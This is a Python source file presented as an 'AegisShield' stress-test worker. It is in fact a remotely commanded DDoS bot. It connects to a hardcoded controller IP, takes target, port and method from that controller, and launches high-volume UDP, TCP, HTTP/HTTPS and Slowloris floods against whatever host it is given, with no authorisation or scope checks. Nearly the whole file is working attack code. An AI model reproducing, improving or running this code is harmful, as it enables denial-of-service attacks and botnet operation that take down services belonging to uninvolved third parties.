#!/usr/bin/env python3
"""
AegisShield Stress Test Worker v2.0 (HIGH PERFORMANCE)
=======================================================
Optimized for 2Gbps+ links. Uses multiprocessing + threading for max throughput.
Usage:
    python3 worker.py --master 52.53.124.44:7777
"""

import socket
import ssl
import threading
import multiprocessing
import json
import time
import random
import argparse
import http.client
import sys
import os


class StressWorker:
    def __init__(self, master_host, master_port):
        self.master_host = master_host
        self.master_port = master_port
        self.sock = None
        self.stop_flag = threading.Event()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.master_host, self.master_port))
                print(f"  ✅ Connected to controller {self.master_host}:{self.master_port}")
                return
            except (ConnectionRefusedError, OSError) as e:
                print(f"  ⏳ Retrying in 3s... ({e})")
                time.sleep(3)

    def send_msg(self, msg):
        try:
            self.sock.sendall(json.dumps(msg).encode())
        except (BrokenPipeError, OSError):
            pass

    def listen(self):
        buffer = ""
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    raise ConnectionResetError("Disconnected")
                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    if line.strip():
                        self.handle_command(json.loads(line))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"  ❌ Lost connection: {e}")
                self.stop_flag.set()
                time.sleep(2)
                self.connect()
                buffer = ""
            except json.JSONDecodeError:
                pass

    def handle_command(self, msg):
        cmd = msg.get("cmd")
        if cmd == "stop":
            print("  🛑 Stop received")
            self.stop_flag.set()
        elif cmd == "attack":
            self.stop_flag.clear()
            power = msg.get("power", 100)
            threading.Thread(
                target=self.run_attack,
                args=(msg["target"], msg["port"], msg["method"],
                      msg["size"], msg["duration"], power),
                daemon=True,
            ).start()

    def run_attack(self, target, port, method, size, duration, power):
        # Scale processes down if power is low
        max_cpus = os.cpu_count() or 4
        # At 1% power, we run 1 process. At 100% we run all.
        cpu_count = max(1, int(max_cpus * (power / 100.0)))
        
        # We also pass the "power" percentage so the loops can sleep to throttle it further
        delay = 0.0
        if power < 100:
            # 1% power = ~0.01 sec delay between rapid ops. 99% power = ~0.0001 sec.
            delay = (100 - power) / 10000.0

        size_disp = "RANDOM" if size == -1 else f"{size}B"
        print(f"  🔥 {method.upper()} → {target}:{port} | {size_disp} | {duration}s | Pwr: {power}%")
        print(f"     Procs: {cpu_count} (Max {max_cpus}) | Throttle delay: {delay:.5f}s")

        if method == "udp":
            self._attack_udp_mp(target, port, size, duration, cpu_count, delay)
        elif method == "tcp":
            self._attack_tcp_mp(target, port, size, duration, cpu_count, delay)
        elif method == "http":
            self._attack_http(target, port, duration, use_ssl=False, power=power)
        elif method == "https":
            self._attack_http(target, port, duration, use_ssl=True, power=power)
        elif method == "slow":
            self._attack_slowloris(target, port, duration, power)

    # ──────────────────────────────────────────────────────────────
    #  UDP FLOOD — Multiprocess + Multithread for max bandwidth
    # ──────────────────────────────────────────────────────────────
    def _attack_udp_mp(self, target, port, size, duration, num_procs, delay):
        counter = multiprocessing.Value('q', 0)  # shared int64 counter
        stop = multiprocessing.Event()
        procs = []

        for _ in range(num_procs):
            p = multiprocessing.Process(
                target=_udp_process,
                args=(target, port, size, duration, counter, stop, delay),
                daemon=True
            )
            p.start()
            procs.append(p)

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                pps = sent / elapsed
                avg_size = 32768 if size == -1 else max(size, 1)
                mbps = sent * avg_size * 8 / elapsed / 1_000_000
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(pps), "mbps": round(mbps, 1),
                               "method": "UDP"})
                print(f"  📊 UDP | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": elapsed})
        print(f"  ✅ UDP done. {total:,} pkts in {elapsed:.1f}s")

    # ──────────────────────────────────────────────────────────────
    #  TCP FLOOD — Multiprocess connection storm
    # ──────────────────────────────────────────────────────────────
    def _attack_tcp_mp(self, target, port, size, duration, num_procs, delay):
        counter = multiprocessing.Value('q', 0)
        stop = multiprocessing.Event()
        procs = []

        for _ in range(num_procs):
            p = multiprocessing.Process(
                target=_tcp_process,
                args=(target, port, size, duration, counter, stop, delay),
                daemon=True
            )
            p.start()
            procs.append(p)

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                cps = sent / elapsed
                
                avg_size = 32768 if size == -1 else max(size, 1)
                mbps = sent * avg_size * 8 / elapsed / 1_000_000
                
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(cps), "mbps": round(mbps, 1),
                               "method": "TCP"})
                print(f"  📊 TCP | {sent:,} conns | {cps:,.0f} conn/s | {mbps:,.1f} Mbps")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": elapsed})
        print(f"  ✅ TCP done. {total:,} conns in {elapsed:.1f}s")

    # ──────────────────────────────────────────────────────────────
    #  HTTP/HTTPS FLOOD
    # ──────────────────────────────────────────────────────────────
    def _attack_http(self, target, port, duration, use_ssl=False, power=100):
        sent = [0]
        end_time = time.time() + duration
        threads = max(1, int(64 * (power / 100.0)))  # throttle threads by power
        proto = "HTTPS" if use_ssl else "HTTP"
        delay = (100 - power) / 1000.0

        def worker():
            while time.time() < end_time and not self.stop_flag.is_set():
                try:
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(target, port, timeout=5, context=ctx)
                    else:
                        conn = http.client.HTTPConnection(target, port, timeout=5)
                    conn.request("GET", "/", headers={
                        "User-Agent": f"Mozilla/5.0 (Windows NT {random.randint(6, 11)}.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "*/*", "Connection": "close",
                    })
                    conn.getresponse()
                    sent[0] += 1
                    conn.close()
                except Exception:
                    sent[0] += 1
                if delay > 0:
                    time.sleep(delay)

        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        start = time.time()
        while time.time() < end_time and not self.stop_flag.is_set():
            time.sleep(2)
            elapsed = max(time.time() - start, 0.1)
            rps = sent[0] / elapsed
            self.send_msg({"type": "stats", "sent": sent[0],
                           "pps": round(rps), "mbps": 0, "method": proto})
            print(f"  📊 {proto} | {sent[0]:,} reqs | {rps:,.0f} req/s")

        for t in thread_list:
            t.join(timeout=2)

        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
        print(f"  ✅ {proto} done. {sent[0]:,} reqs in {elapsed:.1f}s")

    # ──────────────────────────────────────────────────────────────
    #  SLOWLORIS (Ties up proxy connections)
    # ──────────────────────────────────────────────────────────────
    def _attack_slowloris(self, target, port, duration, power):
        end_time = time.time() + duration
        socket_count = max(10, int(300 * (power / 100.0)))
        sent = [0]
        sockets = []

        def setup_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)
                s.connect((target, port))
                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"Host: {target}\r\n".encode("utf-8"))
                s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
                return s
            except OSError:
                return None

        for _ in range(socket_count):
            if self.stop_flag.is_set():
                break
            sock = setup_socket()
            if sock:
                sockets.append(sock)
                sent[0] += 1

        start = time.time()
        while time.time() < end_time and not self.stop_flag.is_set():
            time.sleep(10)
            
            # Keep alive all sockets by sending a fake header periodically
            dead = []
            for i, s in enumerate(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except OSError:
                    dead.append(i)
            
            # Remove dead sockets backwards
            for i in reversed(dead):
                sockets.pop(i)
                
            # Bring sockets back up to desired count
            for _ in range(socket_count - len(sockets)):
                if self.stop_flag.is_set():
                    break
                sock = setup_socket()
                if sock:
                    sockets.append(sock)
                    sent[0] += 1

            active = len(sockets)
            elapsed = max(time.time() - start, 0.1)
            self.send_msg({"type": "stats", "sent": sent[0],
                           "pps": active, "mbps": 0, "method": "SLOW"})
            print(f"  📊 SLOWLORIS | {active} active conns | {sent[0]} total created")

        for s in sockets:
            try:
                s.send("Connection: close\r\n\r\n".encode("utf-8"))
                s.close()
            except OSError:
                pass
                
        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
        print(f"  ✅ SLOWLORIS done. {sent[0]} total conns created")


# ══════════════════════════════════════════════════════════════════
#  Standalone process functions (run in separate processes)
# ══════════════════════════════════════════════════════════════════

def _udp_process(target, port, size_val, duration, counter, stop_event, delay):
    """Each process runs 16 threads, each with its own socket."""
    end_time = time.time() + duration
    BATCH = 50  # update shared counter every N packets

    def sender():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Max send buffer for throughput
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except Exception:
            pass
        c = 0
        
        # Pre-allocate random payload if fixed size
        if size_val > 0:
            payload = random.randbytes(size_val)
            
        while time.time() < end_time and not stop_event.is_set():
            try:
                if size_val == -1:
                    payload = random.randbytes(random.randint(64, 65507))
                s.sendto(payload, (target, port))
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
                if delay > 0:
                    time.sleep(delay)
            except OSError:
                pass
        # flush remainder
        with counter.get_lock():
            counter.value += c % BATCH
        s.close()

    threads = []
    for _ in range(16):
        t = threading.Thread(target=sender, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _tcp_process(target, port, size_val, duration, counter, stop_event, delay):
    """Each process runs 16 threads doing TCP connections."""
    end_time = time.time() + duration
    BATCH = 10

    def connector():
        c = 0
        if size_val > 0:
            payload = random.randbytes(size_val)
            
        while time.time() < end_time and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                if size_val == -1:
                    payload = random.randbytes(random.randint(64, 32768))
                s.sendall(payload)
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
                s.close()
                if delay > 0:
                    time.sleep(delay)
            except OSError:
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
        with counter.get_lock():
            counter.value += c % BATCH

    threads = []
    for _ in range(16):
        t = threading.Thread(target=connector, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


BANNER = r"""
   __        __         _               ____  
   \ \      / /__  _ __| | _____ _ __  |___ \ 
    \ \ /\ / / _ \| '__| |/ / _ \ '__|   __) |
     \ V  V / (_) | |  |   <  __/ |     / __/ 
      \_/\_/ \___/|_|  |_|\_\___|_|    |_____|

  AegisShield Stress Test Worker v3.0 (ADVANCED)
"""


def main():
    parser = argparse.ArgumentParser(description="Stress Test Worker v3")
    parser.add_argument("--master", required=True,
                        help="Controller address (e.g. 52.53.124.44:7777)")
    args = parser.parse_args()

    host, port = args.master.rsplit(":", 1)
    port = int(port)

    print(BANNER)
    cpus = os.cpu_count() or 4
    print(f"  CPUs: {cpus}")
    print(f"  🎯 Connecting to controller: {host}:{port}\n")

    w = StressWorker(host, port)
    w.connect()
    w.listen()


if __name__ == "__main__":
    main()
